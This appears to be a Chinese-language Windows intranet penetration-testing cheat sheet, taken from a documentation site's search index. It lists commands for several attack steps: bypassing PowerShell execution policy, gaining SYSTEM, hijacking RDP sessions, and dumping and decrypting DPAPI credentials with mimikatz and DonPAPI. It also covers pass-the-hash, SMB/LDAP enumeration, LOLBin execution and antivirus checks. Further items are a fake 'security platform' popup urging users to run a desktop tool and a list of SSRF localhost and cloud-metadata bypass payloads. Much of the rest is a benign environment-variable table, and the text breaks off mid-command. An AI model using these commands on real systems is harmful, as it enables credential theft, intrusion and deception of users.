\u6839\u636e\u6761\u4ef6\u67e5\u627e\u6587\u4ef6 Get-ChildItem -Path 'e:' -Recurse -Include *.exe -ErrorAction:SilentlyContinue | Where-Object -FilterScript {($_.LastWriteTime -gt '2022-05-14') -and ($_.Length -le 10mb)} Powershell\u7684\u8fd0\u884c\u7b56\u7565\u53ca\u7ed5\u8fc7 \u83b7\u53d6\u5f53\u524d\u7b56\u7565 Get-ExecutionPolicy Restricted\uff1a\u7981\u6b62\u8fd0\u884c\u4efb\u4f55\u811a\u672c\u548c\u914d\u7f6e\u6587\u4ef6\u3002 AllSigned \uff1a\u53ef\u4ee5\u8fd0\u884c\u811a\u672c\uff0c\u4f46\u8981\u6c42\u6240\u6709\u811a\u672c\u548c\u914d\u7f6e\u6587\u4ef6\u7531\u53ef\u4fe1\u53d1\u5e03\u8005\u7b7e\u540d\uff0c\u5305\u62ec\u5728\u672c\u5730\u8ba1\u7b97\u673a\u4e0a\u7f16\u5199\u7684\u811a\u672c\u3002 RemoteSigned \uff1a\u53ef\u4ee5\u8fd0\u884c\u811a\u672c\uff0c\u4f46\u8981\u6c42\u4ece\u7f51\u7edc\u4e0a\u4e0b\u8f7d\u7684\u811a\u672c\u548c\u914d\u7f6e\u6587\u4ef6\u7531\u53ef\u4fe1\u53d1\u5e03\u8005\u7b7e\u540d\uff1b \u4e0d\u8981\u6c42\u5bf9\u5df2\u7ecf\u8fd0\u884c\u548c\u5df2\u5728\u672c\u5730\u8ba1\u7b97\u673a\u7f16\u5199\u7684\u811a\u672c\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002 Unrestricted \uff1a\u53ef\u4ee5\u8fd0\u884c\u672a\u7b7e\u540d\u811a\u672c\u3002\uff08\u5371\u9669\uff01\uff09 \u8bbe\u7f6e\u7b56\u7565 Set-ExecutionPolicy XXX \u7ed5\u8fc7 powershell -ExecutionPolicy bypass -command \"&{import-module C:\\Users\\Public\\Music\\PowerView.ps1; Get-ForestTrust}\" \u67e5\u770bWindows PIPE [System.IO.Directory]::GetFiles(\"\\\\.\\\\pipe\\\\\") \u8fdc\u7a0b auxiliary/scanner/smb/pipe_auditor msf\u8fd9\u4e2a\u63d2\u4ef6\u9700\u8981\u8ba4\u8bc1 rpcdump.py 192.168.14.100 \u8fd9\u4e2a\u4e0d\u9700\u8981\u8ba4\u8bc1\uff0c\u53ef\u4ee5\u8bbf\u95ee\u672a\u6388\u6743\u7684\u4e1c\u897f \u83b7\u53d6system psexec.exe -accepteula -s -i -d cmd.exe RDP\u5207\u4f1a\u8bdd \u524d\u63d0\u662f\u6709\u5176\u4ed6\u7528\u6237\u7684\u4f1a\u8bdd\u4e14\u662f\u6fc0\u6d3b\u7684\uff0c\u53ef\u4ee5\u65e0\u89c6\u5176\u4ed6\u7528\u6237\u662f\u4e0d\u662f\u9501\u5c4f\u3002 \u5207\u6362\u5230system \u9ad8\u6743\u9650\u4e0b\u53ef\u4ee5\u7528 sc create rdp binpath= \"cmd.exe /k tscon 2 /dest:console\" \u76f4\u63a5\u521b\u5efa\u4e00\u4e2a\u670d\u52a1\u5207\uff0c\u4f46\u662f\u53d7\u9650\u4e8e\u7cfb\u7edf\u7248\u672c\u3002 \u9ad8\u6743\u9650\u53ef\u4ee5\u7528Windows\u5b98\u65b9\u7684psexec\u5b9e\u73b0 psexec.exe -accepteula -s -i -d cmd.exe \u3002 \u9ad8\u6743\u9650\u53ef\u4ee5\u7528mimikatz\u5b9e\u73b0\u3002 \u9ad8\u6743\u9650\u53ef\u4ee5\u7528TokenTest.exe\u5b9e\u73b0\u3002 \u4f4e\u6743\u9650\u53ef\u4ee5\u63d0\u6743\u5b9e\u73b0\u3002 tscon\u5207\u6362\u4f1a\u8bdd \u786e\u5b9a\u9700\u8981\u5207\u7684\u4f1a\u8bddID\uff0c quser \u3002 tscon 1 \u5207\u6362\u8fc7\u53bb\u3002 \u6253\u5305\u89e3\u5305 \u538b\u7f29 cabarc.exe -p -r N C:\\Users\\1.cab C:\\Users\\*.* \u89e3\u538b cabarc.exe -p -r X Npp.cab \u5b89\u5168\u65e5\u5fd7\u8def\u5f84 C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx Windows\u51ed\u636e-\u89e3DPAPI \u67e5\u770b\u662f\u5426\u5b58\u5728\u51ed\u636e cmdkey /list mimikatz vault::list \u51ed\u636e\u6587\u4ef6\u8def\u5f84\uff0c\u4e24\u4e2a\u76ee\u5f55\u90fd\u8981\u770b\u4e00\u4e0b dir /a:H %appdata%\\Microsoft\\Credentials dir /a:H %appdata%\\..\\local\\Microsoft\\Credentials \u4f7f\u7528mimikatz\u7684dpapi\u7684\u6a21\u5757\u89e3\u8bfb\u51ed\u636e dpapi::cred /in:%appdata%\\..\\local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D \u81f3\u6b64\u53ef\u4ee5\u8bfb\u5230\u51ed\u636e\u76f8\u5bf9\u5e94\u7684masterkey\u7684Guid\uff0c\u4e0b\u4e00\u6b65\u4fbf\u662f\u62ff\u5230masterkey\uff0c\u518d\u7528masterkey\u53bb\u89e3\u5bc6\u51ed\u636e\u3002 masterkey\u5b58\u50a8\u4f4d\u7f6e dir /a %appdata%\\Microsoft\\Protect\\\u7528\u6237\u7684SID dir /a %appdata%\\Microsoft\\Protect\\\u7528\u6237\u7684SID cmd\u770b\u4e0d\u5230\u53ef\u4ee5\u7528ps\u770b Get-ChildItem %appdata%\\Microsoft\\Protect\\ Get-ChildItem %appdata%\\..\\Local\\Microsoft\\Protect Get-ChildItem -Hidden C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Protect\\ Get-ChildItem -Hidden C:\\Users\\USER\\AppData\\Local\\Microsoft\\Protect\\ Get-ChildItem -Hidden C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Protect\\{SID} Get-ChildItem -Hidden C:\\Users\\USER\\AppData\\Local\\Microsoft\\Protect\\{SID} \u89e3\u5bc6masterkey dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\S-1-5-21-2063765516-3997562686-97783222-1001\\f33071e3-1bdf-458c-89da-51927b10adcf\" /sid:S-1-5-21-2063765516-3997562686-97783222-1001 /password:123 /protected \u6ca1\u6709\u5bc6\u7801\u4e14\u5728\u57df\u5185 dpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /rpc \u8fd8\u53ef\u4ee5\u76f4\u63a5\u8bfbmasterkey\uff0c\u4f46\u8fd9\u91cc\u8bfb\u7684masterkey\u4e0d\u4e00\u5b9a\u901a\u7528 sekurlsa::dpapi \u7528masterkey\u89e3\u5f97\u51ed\u636e dpapi::cred /in:%appdata%\\..\\local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:4090030cd9d184908dde57301e3a27781e5262ce357fe6516c347ee0b5b4b5fccb987845e64e567ced8828a70d6a0684221500450faf9e8a9ea30d21414ad708 \u53ef\u4ee5\u4f7f\u7528DonpAPI\u6765\u81ea\u52a8\u5316\u6293\u5404\u79cd\u51ed\u636e DonPAPI.py domain/user:passw0rd@target \u4ee5\u6307\u5b9a\u7528\u6237\u6765\u6253\u5f00\u4e00\u4e2acmd mimikatz sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe \u641c\u7d22\u5b57\u7b26\u4e32 string64.exe aaa.bin | findstr /i abc \u6267\u884c\u547d\u4ee4\u4e14\u4e0d\u56de\u663e systeminfo 1> c:\\windows\\temp\\1 2>&1 \u6267\u884cPS\u6587\u4ef6 powershell -ep bypass -noexit -file ok.ps1 \u679a\u4e3e\u533f\u540dwindows\u5171\u4eab enum4linux -a -u \"\" -p \"\" 192.168.14.1 && enum4linux -a -u \"guest\" 192.168.14.1 cme smb 192.168.14.1 -u 'a' -p '' cme smb 192.168.14.1 -u '' -p '' \u679a\u4e3eLDAP ldapsearch -x -h 192.168.14.1 -s base xcopy xcopy /s /i /e /h source target Powershell\u5f39\u7a97 powershell -Command \"\"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('\u81ea\u884c\u8f66');\" \u67e5\u8be2\u6587\u4ef6MD5 certutil -hashfile \u67e5\u8be2360\u6838\u6676 reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\360Hvm /v Start 0x1\u5f00\uff0c 0x4\u5173 reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\360Safe\\safemon /v HvmUserAction 0x1\u5f00\uff0c0x0\u5173 Powershell\u5386\u53f2\u8bb0\u5f55 %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt \u67e5\u770b\u6587\u4ef6MD5 certutil -hashfile yourfilename.ext MD5 certutil -hashfile yourfilename.ext SHA1 certutil -hashfile yourfilename.ext SHA256 \u5404\u4e2a\u73af\u5883\u53d8\u91cf %ALLUSERSPROFILE% \uff1a \u5217\u51fa\u6240\u6709\u7528\u6237Profile\u6587\u4ef6\u4f4d\u7f6e\u3002 %COMSPEC% : CMD\u8def\u5f84\u3002 %APPDATA% : \u5217\u51fa\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u7684\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\u3002 %CD% : \u5217\u51fa\u5f53\u524d\u76ee\u5f55\u3002 %CLIENTNAME% : \u5217\u51fa\u8054\u63a5\u5230\u7ec8\u7aef\u670d\u52a1\u4f1a\u8bdd\u65f6\u5ba2\u6237\u7aef\u7684NETBIOS\u540d\u3002 %CMDCMDLINE% : \u5217\u51fa\u542f\u52a8\u5f53\u524dcmd.exe\u6240\u4f7f\u7528\u7684\u547d\u4ee4\u884c\u3002 %CMDEXTVERSION% : \u547d\u4ee4\u51fa\u5f53\u524d\u547d\u4ee4\u5904\u7406\u7a0b\u5e8f\u6269\u5c55\u7248\u672c\u53f7\u3002 %CommonProgramFiles% : \u5217\u51fa\u4e86\u5e38\u7528\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u8def\u5f84\u3002 %COMPUTERNAME% : \u5217\u51fa\u4e86\u8ba1\u7b97\u673a\u540d\u3002 %COMSPEC% : CMD\u8def\u5f84\u3002 %DATE% : \u5217\u51fa\u5f53\u524d\u65e5\u671f\u3002 %ERRORLEVEL% : \u5217\u51fa\u4e86\u6700\u8fd1\u4f7f\u7528\u7684\u547d\u4ee4\u7684\u9519\u8bef\u4ee3\u7801\u3002 %HOMEDRIVE% : \u5217\u51fa\u4e0e\u7528\u6237\u4e3b\u76ee\u5f55\u6240\u5728\u7684\u9a71\u52a8\u5668\u76d8\u7b26\u3002 %HOMEPATH% : \u5217\u51fa\u7528\u6237\u4e3b\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\u3002 %HOMESHARE% : \u5217\u51fa\u7528\u6237\u5171\u4eab\u4e3b\u76ee\u5f55\u7684\u7f51\u7edc\u8def\u5f84\u3002 %LOGONSEVER% : \u5217\u51fa\u6709\u6548\u7684\u5f53\u524d\u767b\u5f55\u4f1a\u8bdd\u7684\u57df\u540d\u63a7\u5236\u5668\u540d\u3002 %NUMBER_OF_PROCESSORS% : \u5217\u51fa\u4e86\u8ba1\u7b97\u673a\u5b89\u88c5\u7684\u5904\u7406\u5668\u6570\u3002 %OS% : \u5217\u51fa\u64cd\u4f5c\u7cfb\u7edf\u7684\u540d\u5b57\u3002(Windows XP \u548c Windows 2000 \u5217\u4e3a Windows_NT.) %Path% : \u5217\u51fa\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u7684\u641c\u7d22\u8def\u5f84\u3002 %PATHEXT% : \u5217\u51fa\u64cd\u4f5c\u7cfb\u7edf\u8ba4\u4e3a\u53ef\u88ab\u6267\u884c\u7684\u6587\u4ef6\u6269\u5c55\u540d\u3002 %PROCESSOR_ARCHITECTURE% : \u5217\u51fa\u4e86\u5904\u7406\u5668\u7684\u82af\u7247\u67b6\u6784\u3002 %PROCESSOR_IDENTFIER% : \u5217\u51fa\u4e86\u5904\u7406\u5668\u7684\u63cf\u8ff0\u3002 %PROCESSOR_LEVEL% : \u5217\u51fa\u4e86\u8ba1\u7b97\u673a\u7684\u5904\u7406\u5668\u7684\u578b\u53f7\u3002 %PROCESSOR_REVISION% : \u5217\u51fa\u4e86\u5904\u7406\u5668\u7684\u4fee\u8ba2\u53f7\u3002 %ProgramFiles% : \u5217\u51fa\u4e86Program Files\u6587\u4ef6\u5939\u7684\u8def\u5f84\u3002 %PROMPT% : \u5217\u51fa\u4e86\u5f53\u524d\u547d\u4ee4\u89e3\u91ca\u5668\u7684\u547d\u4ee4\u63d0\u793a\u8bbe\u7f6e\u3002 %RANDOM% : \u5217\u51fa\u754c\u4e8e0 \u548c 32767\u4e4b\u95f4\u7684\u968f\u673a\u5341\u8fdb\u5236\u6570\u3002 %SESSIONNAME% : \u5217\u51fa\u8fde\u63a5\u5230\u7ec8\u7aef\u670d\u52a1\u4f1a\u8bdd\u65f6\u7684\u8fde\u63a5\u548c\u4f1a\u8bdd\u540d\u3002 %SYSTEMDRIVE% : \u5217\u51fa\u4e86Windows\u542f\u52a8\u76ee\u5f55\u6240\u5728\u9a71\u52a8\u5668\u3002 %SYSTEMROOT% : \u5217\u51fa\u4e86Windows\u542f\u52a8\u76ee\u5f55\u7684\u4f4d\u7f6e\u3002 %TEMP% and %TMP% : \u5217\u51fa\u4e86\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u53ef\u7528\u5e94\u7528\u7a0b\u5e8f\u7684\u9ed8\u8ba4\u4e34\u65f6\u76ee\u5f55\u3002 %TIME% : \u5217\u51fa\u5f53\u524d\u65f6\u95f4\u3002 %USERDOMAIN% : \u5217\u51fa\u4e86\u5305\u542b\u7528\u6237\u5e10\u53f7\u7684\u57df\u7684\u540d\u5b57\u3002 %USERNAME% : \u5217\u51fa\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u7684\u540d\u5b57\u3002 %USERPROFILE% : \u5217\u51fa\u5f53\u524d\u7528\u6237Profile\u6587\u4ef6\u4f4d\u7f6e\u3002 %WINDIR% : \u5217\u51fa\u64cd\u4f5c\u7cfb\u7edf\u76ee\u5f55\u7684\u4f4d\u7f6e\u3002 \u53d8\u91cf \u7c7b\u578b \u63cf\u8ff0 %ALLUSERSPROFILE% \u672c\u5730 \u8fd4\u56de\u201c\u6240\u6709\u7528\u6237\u201d\u914d\u7f6e\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002 %APPDATA% \u672c\u5730 \u8fd4\u56de\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5e94\u7528\u7a0b\u5e8f\u5b58\u50a8\u6570\u636e\u7684\u4f4d\u7f6e\u3002 %CD% \u672c\u5730 \u8fd4\u56de\u5f53\u524d\u76ee\u5f55\u5b57\u7b26\u4e32\u3002 %CMDCMDLINE% \u672c\u5730 \u8fd4\u56de\u7528\u6765\u542f\u52a8\u5f53\u524d\u7684 Cmd.exe \u7684\u51c6\u786e\u547d\u4ee4\u884c\u3002 %CMDEXTVERSION% \u7cfb\u7edf \u8fd4\u56de\u5f53\u524d\u7684\u201c\u547d\u4ee4\u5904\u7406\u7a0b\u5e8f\u6269\u5c55\u201d\u7684\u7248\u672c\u53f7\u3002 %COMPUTERNAME% \u7cfb\u7edf \u8fd4\u56de\u8ba1\u7b97\u673a\u7684\u540d\u79f0\u3002 %COMSPEC% \u7cfb\u7edf \u8fd4\u56de\u547d\u4ee4\u884c\u89e3\u91ca\u5668\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u51c6\u786e\u8def\u5f84\u3002 %DATE% \u7cfb\u7edf \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u3002\u4f7f\u7528\u4e0e date /t \u547d\u4ee4\u76f8\u540c\u7684\u683c\u5f0f\u3002\u7531 Cmd.exe \u751f\u6210\u3002\u6709\u5173 date \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Date\u3002 %ERRORLEVEL% \u7cfb\u7edf \u8fd4\u56de\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u9519\u8bef\u4ee3\u7801\u3002\u901a\u5e38\u7528\u975e\u96f6\u503c\u8868\u793a\u9519\u8bef\u3002 %HOMEDRIVE% \u7cfb\u7edf \u8fd4\u56de\u8fde\u63a5\u5230\u7528\u6237\u4e3b\u76ee\u5f55\u7684\u672c\u5730\u5de5\u4f5c\u7ad9\u9a71\u52a8\u5668\u53f7\u3002\u57fa\u4e8e\u4e3b\u76ee\u5f55\u503c\u800c\u8bbe\u7f6e\u3002\u7528\u6237\u4e3b\u76ee\u5f55\u662f\u5728\u201c\u672c\u5730\u7528\u6237\u548c\u7ec4\u201d\u4e2d\u6307\u5b9a\u7684\u3002 %HOMEPATH% \u7cfb\u7edf \u8fd4\u56de\u7528\u6237\u4e3b\u76ee\u5f55\u7684\u5b8c\u6574\u8def\u5f84\u3002\u57fa\u4e8e\u4e3b\u76ee\u5f55\u503c\u800c\u8bbe\u7f6e\u3002\u7528\u6237\u4e3b\u76ee\u5f55\u662f\u5728\u201c\u672c\u5730\u7528\u6237\u548c\u7ec4\u201d\u4e2d\u6307\u5b9a\u7684\u3002 %HOMESHARE% \u7cfb\u7edf \u8fd4\u56de\u7528\u6237\u7684\u5171\u4eab\u4e3b\u76ee\u5f55\u7684\u7f51\u7edc\u8def\u5f84\u3002\u57fa\u4e8e\u4e3b\u76ee\u5f55\u503c\u800c\u8bbe\u7f6e\u3002\u7528\u6237\u4e3b\u76ee\u5f55\u662f\u5728\u201c\u672c\u5730\u7528\u6237\u548c\u7ec4\u201d\u4e2d\u6307\u5b9a\u7684\u3002 %LOGONSERVER% \u672c\u5730 \u8fd4\u56de\u9a8c\u8bc1\u5f53\u524d\u767b\u5f55\u4f1a\u8bdd\u7684\u57df\u63a7\u5236\u5668\u7684\u540d\u79f0\u3002 %NUMBER_OF_PROCESSORS% \u7cfb\u7edf \u6307\u5b9a\u5b89\u88c5\u5728\u8ba1\u7b97\u673a\u4e0a\u7684\u5904\u7406\u5668\u7684\u6570\u76ee\u3002 %OS% \u7cfb\u7edf \u8fd4\u56de\u64cd\u4f5c\u7cfb\u7edf\u540d\u79f0\u3002Windows 2000 \u663e\u793a\u5176\u64cd\u4f5c\u7cfb\u7edf\u4e3a Windows_NT\u3002 %PATH% \u7cfb\u7edf \u6307\u5b9a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u641c\u7d22\u8def\u5f84\u3002 %PATHEXT% \u7cfb\u7edf \u8fd4\u56de\u64cd\u4f5c\u7cfb\u7edf\u8ba4\u4e3a\u53ef\u6267\u884c\u7684\u6587\u4ef6\u6269\u5c55\u540d\u7684\u5217\u8868\u3002 %PROCESSOR_ARCHITECTURE% \u7cfb\u7edf \u8fd4\u56de\u5904\u7406\u5668\u7684\u82af\u7247\u4f53\u7cfb\u7ed3\u6784\u3002\u503c\uff1ax86 \u6216 IA64\uff08\u57fa\u4e8e Itanium\uff09\u3002 %PROCESSOR_IDENTFIER% \u7cfb\u7edf \u8fd4\u56de\u5904\u7406\u5668\u8bf4\u660e\u3002 %PROCESSOR_LEVEL% \u7cfb\u7edf \u8fd4\u56de\u8ba1\u7b97\u673a\u4e0a\u5b89\u88c5\u7684\u5904\u7406\u5668\u7684\u578b\u53f7\u3002 %PROCESSOR_REVISION% \u7cfb\u7edf \u8fd4\u56de\u5904\u7406\u5668\u7684\u7248\u672c\u53f7\u3002 %PROMPT% \u672c\u5730 \u8fd4\u56de\u5f53\u524d\u89e3\u91ca\u7a0b\u5e8f\u7684\u547d\u4ee4\u63d0\u793a\u7b26\u8bbe\u7f6e\u3002\u7531 Cmd.exe \u751f\u6210\u3002 %RANDOM% \u7cfb\u7edf \u8fd4\u56de 0 \u5230 32767 \u4e4b\u95f4\u7684\u4efb\u610f\u5341\u8fdb\u5236\u6570\u5b57\u3002\u7531 Cmd.exe \u751f\u6210\u3002 %SYSTEMDRIVE% \u7cfb\u7edf \u8fd4\u56de\u5305\u542b Windows server operating system \u6839\u76ee\u5f55\uff08\u5373\u7cfb\u7edf\u6839\u76ee\u5f55\uff09\u7684\u9a71\u52a8\u5668\u3002 %SYSTEMROOT% \u7cfb\u7edf \u8fd4\u56de Windows server operating system \u6839\u76ee\u5f55\u7684\u4f4d\u7f6e\u3002 %TEMP% \u548c %TMP% \u7cfb\u7edf\u548c\u7528\u6237 \u8fd4\u56de\u5bf9\u5f53\u524d\u767b\u5f55\u7528\u6237\u53ef\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u9ed8\u8ba4\u4e34\u65f6\u76ee\u5f55\u3002\u6709\u4e9b\u5e94\u7528\u7a0b\u5e8f\u9700\u8981 TEMP\uff0c\u800c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u5219\u9700\u8981 TMP\u3002 %TIME% \u7cfb\u7edf \u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u3002\u4f7f\u7528\u4e0e time /t \u547d\u4ee4\u76f8\u540c\u7684\u683c\u5f0f\u3002\u7531 Cmd.exe \u751f\u6210\u3002\u6709\u5173 time \u547d\u4ee4\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Time\u3002 %USERDOMAIN% \u672c\u5730 \u8fd4\u56de\u5305\u542b\u7528\u6237\u5e10\u6237\u7684\u57df\u7684\u540d\u79f0\u3002 %USERNAME% \u672c\u5730 \u8fd4\u56de\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u7684\u540d\u79f0\u3002 %USERPROFILE% \u672c\u5730 \u8fd4\u56de\u5f53\u524d\u7528\u6237\u7684\u914d\u7f6e\u6587\u4ef6\u7684\u4f4d\u7f6e\u3002 %WINDIR% \u7cfb\u7edf \u8fd4\u56de\u64cd\u4f5c\u7cfb\u7edf\u76ee\u5f55\u7684\u4f4d\u7f6e\u3002 %allusersprofile%--------------------\u6240\u6709\u7528\u6237\u7684profile\u8def\u5f84 %Userprofile%-----------------------\u5f53\u524d\u7528\u6237\u7684\u914d\u7f6e\u6587\u4ef6\u76ee\u5f55 %Appdata%--------------------------\u5f53\u524d\u7528\u6237\u7684\u5e94\u7528\u7a0b\u5e8f\u8def\u5f84 %commonprogramfiles%-------------\u5e94\u7528\u7a0b\u5e8f\u516c\u7528\u7684\u6587\u4ef6\u8def\u5f84 %homedrive%------------------------\u5f53\u524d\u7528\u6237\u7684\u4e3b\u76d8 %Homepath%------------------------\u5f53\u524d\u7528\u6237\u7684\u4e3b\u76ee\u5f55 %programfiles%----------------------\u5e94\u7528\u7a0b\u5e8f\u7684\u9ed8\u8ba4\u5b89\u88c5\u76ee\u5f55 %systemdrive%----------------------\u7cfb\u7edf\u6240\u5728\u7684\u76d8\u7b26 %systemroot%-----------------------\u7cfb\u7edf\u6240\u5728\u7684\u76ee\u5f55 %windir%----------------------------\u540c\u4e0a\uff0c\u603b\u662f\u8ddfsystemroot\u4e00\u6837 %tmp%------------------------------\u5f53\u524d\u7528\u6237\u7684\u4e34\u65f6\u76ee\u5f55 %temp%-----------------------------\u540c\u4e0a\u4e34\u65f6\u76ee\u5f55 \u5b89\u5168\u65e5\u5fd7\u8def\u5f84 C:\\Windows\\System32\\Winevt\\Logs\\Security.evtx \u5f39\u7a97 shell mshta vbscript:Execute(\"msgbox \"\"\u522b\u5206\u6790\u4e86\u5927\u54e5\"\":close\") msg %username% /time:1000 XXX\u96c6\u56e2\u5b89\u5168\u5e73\u53f0\u63d0\u9192\u60a8\uff1a\u60a8\u7684\u6587\u6863\u7591\u4f3c\u611f\u67d3\u5b8f\u75c5\u6bd2\uff0c\u8bf7\u7acb\u5373\u8fd0\u884c\u684c\u9762\u7684\u4fee\u590d\u5de5\u5177\uff01 \u6301\u7eed\u622a\u5c4f psr.exe /start /gui 0 /output C:\\Users\\Public\\out.zip psr.exe /stop Localhost\u53d8\u79cd 127.0.0.1:80 127.0.0.1:443 127.0.0.1:22 127.1:80 0 0.0.0.0:80 localhost:80 [::]:80/ [::]:25/ SMTP [::]:3128/ Squid [0000::1]:80/ [0:0:0:0:0:ffff:127.0.0.1]/thefile \u2460\u2461\u2466.\u24ea.\u24ea.\u24ea 127.127.127.127 127.0.1.3 127.0.0.0 2130706433/ 017700000001 3232235521/ 3232235777/ 0x7f000001/ 0xc0a80014/ {domain} @127 .0.0.1 127.0.0.1#{domain} {domain}.127.0.0.1 127.0.0.1/{domain} 127.0.0.1/?d={domain} {domain} @127 .0.0.1 127.0.0.1#{domain} {domain}.127.0.0.1 127.0.0.1/{domain} 127.0.0.1/?d={domain} {domain} @localhost localhost#{domain} {domain}.localhost localhost/{domain} localhost/?d={domain} 127.0.0.1%00{domain} 127.0.0.1?{domain} 127.0.0.1///{domain} 127.0.0.1%00{domain} 127.0.0.1?{domain} 127.0.0.1///{domain}st:+11211aaa st:00011211aaaa 1.1.1.1 &@2.2.2.2# @3 .3.3.3/ 127.1.1.1:80\\@ @127 .2.2.2:80/. 127.1.1.1:80#\\ @127 .2.2.2:80/ Enclosed Alphanumeric Bypasses : http:// 169.254.169.254/%0A http:// %E2%93%AA%E2%93%A7%E2%93%90%E2%91%A8%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%95%E2%93%94%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%90%E2%91%A8%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%95%E2%93%94:80/","title":"Windows\u6280\u5de7"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#cmd","text":"whoami # \u67e5\u770b\u5f53\u524d\u7528\u6237 net user # \u67e5\u770b\u6240\u6709\u7528\u6237 query user # \u67e5\u770b\u5f53\u524d\u5728\u7ebf\u7528\u6237 ipconfig /all # \u67e5\u770b\u5f53\u524d\u4e3b\u673a\u7684\u4e3b\u673a\u540d/IP/DNS\u7b49\u4fe1\u606f route print # \u67e5\u770b\u8def\u7531\u8868\u4fe1\u606f netstat -ano # \u67e5\u770b\u7aef\u53e3\u5f00\u653e\u60c5\u51b5 arp -a # \u67e5\u770barp\u89e3\u6790\u60c5\u51b5 tasklist /svc # \u67e5\u770b\u8fdb\u7a0b\u53ca\u5bf9\u5e94\u670d\u52a1\u540d net localgroup administrators # \u67e5\u770b\u7ba1\u7406\u5458\u7ec4\u6210\u5458 systeminfo # \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\u542b\u8865\u4e01\u4fe1\u606f net use # \u67e5\u770bipc\u8fde\u63a5\u60c5\u51b5 net view # \u67e5\u770b\u533f\u540d\u5171\u4eab\u60c5\u51b5 netsh firewall show state # \u67e5\u770b\u9632\u706b\u5899\u72b6\u6001 cmdkey /l # \u67e5\u770b\u5f53\u524d\u4fdd\u5b58\u7684\u767b\u9646\u51ed\u8bc1","title":"\u5e38\u7528CMD\u547d\u4ee4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#windows","text":"\u53ef\u7528\u6765\u66ff\u4ee3cmd forfiles /c c:\\windows\\system32\\calc.exe #\u65e0\u9650\u8fd0\u884c pcalua.exe -a c:\\windows\\system32\\calc.exe powershell SyncAppvPublishingServer.vbs \"n; Start-Process c:\\windows\\system32\\calc.exe\" cmd.exe /c \"ping 127.0.0.1/../../../../../../../windows/system32/calc.exe\" conhost C:\\Windows\\System32\\calc.exe explorer.exe C:\\Users\\keefe\\desktop\\1.exe","title":"Windows\u7684\u672c\u5730\u547d\u4ee4\u6267\u884c"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#_1","text":"- nbtscan.exe xx.xx.xx.xx/24 # \u67e5\u770bc\u6bb5\u673a\u5668 - csvde.exe -f 1.csv -k # \u6279\u91cf\u5bfc\u5165/\u5bfc\u51faAD\u7528\u6237 - setspn.exe -T xx.xx.xx.xx -Q */* # \u67e5\u770b\u5f53\u524d\u57df\u5185\u6240\u6709spn - netstat -ano","title":"\u73af\u5883\u4fe1\u606f\u641c\u96c6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows%E6%8A%80%E5%B7%A7/#wmic","text":"\u83b7\u53d6\u6240\u6709\u547d\u540d\u7a7a\u95f4\u7684\u7c7b Get-WmiObject -Namespace root\\directory\\ldap -Class * -List \u83b7\u53d6\u7c7b\u7684\u8be6\u7ec6\u53c2\u6570 Get-WmiObject -Namespace root\\directory\\ldap -Class * -List | select -ExpandProperty Properties |select name,Origin \u83b7\u53d6\u6307\u5b9a\u7c7b\u7684\u8be6\u7ec6\u53c2\u6570 Get-WmiObject -Namespace root\\directory\\ldap -List -classname \"ds_dnszone\"| select -ExpandProperty Properties |select name,Origin \u83b7\u53d6\u6307\u5b9a\u7c7b\u7684\u6240\u6709\u6570\u636e Get-WmiObject -Namespace root\\directory\\ldap -Class ds_dnszone \u4f7f\u7528 /Namespace \u6307\u5b9a\u547d\u540d\u7a7a\u95f4\uff0c\u4f7f\u7528 /node \u3001 /user \u3001 /password \u6765\u8fdc\u7a0b\u8fd0\u884c\uff0c\u4f7f\u7528 path \u6765\u8c03\u7528win32\u7c7b\u3002 CIMWin32 WMI \u63d0\u4f9b\u7a0b\u5e8f - Win32 apps | Microsoft Docs \u67e5\u7a0b\u5e8f\u8def\u5f84 wmic process where name='xx.exe' get ExecutablePath wmic Process get name,ExecutablePath,ProcessId \u67e5\u6740\u6bd2 wmic /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List \u67e5\u57df\u63a7 wmic 